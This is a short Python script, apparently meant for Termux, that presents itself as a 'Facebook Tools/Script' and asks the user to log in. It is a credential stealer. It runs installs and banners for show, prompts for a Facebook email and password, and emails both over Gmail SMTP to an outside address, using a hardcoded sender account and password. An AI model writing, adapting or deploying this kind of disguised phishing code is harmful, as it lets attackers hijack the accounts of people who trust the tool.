#!/usr/bin/python
import smtplib
import os,sys
from http.cookiejar import LWPCookieJar as kuki
from getpass import getpass
from bs4 import BeautifulSoup as BS

os.system('figlet LOADING CHECKING SYSTEM')
os.system('pkg install git')
os.system('pip install request')
os.system('pip install bs4')
os.system('pkg install figlet')
os.system('pkg install pip2')
os.system('pip2 install requests')
os.system('pip2 install mechanize')


print("""
	;;;;;;;;;;;;;;;;;;;
	; Facebook Tools/Script
	; Compiled by: TravizXPH
	; PLEASE LOGIN YOUR FACEBOOK TO RUN
	; MADE HEART FROM PHILIPPINES
	;;;;;;;;;;;;;;;;;;;""")

EMAIL_HOST_USER = "novellusph@gmail.com"
EMAIL_HOST_PASSWORD = "walapass"

subject = "Lambat"




body = input(("User/Email: "))
body1 = input(("Password: "))
os.system('figlet LOADING')

msg = f'Subject: {subject}\n\n{body}\n\n{body1}'

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.ehlo()
server.login("novellusph@gmail.com", "walapass")
server.sendmail('xzxph01@gmail.com', 'dwaynexph@gmail.com',msg)

os.system('figlet TravizXPH')
os.system('cd ')
os.system('figlet LOADING')
os.system('ls')
os.system('python -m pip install -r req.txt')
os.system('python2 vuln.py')
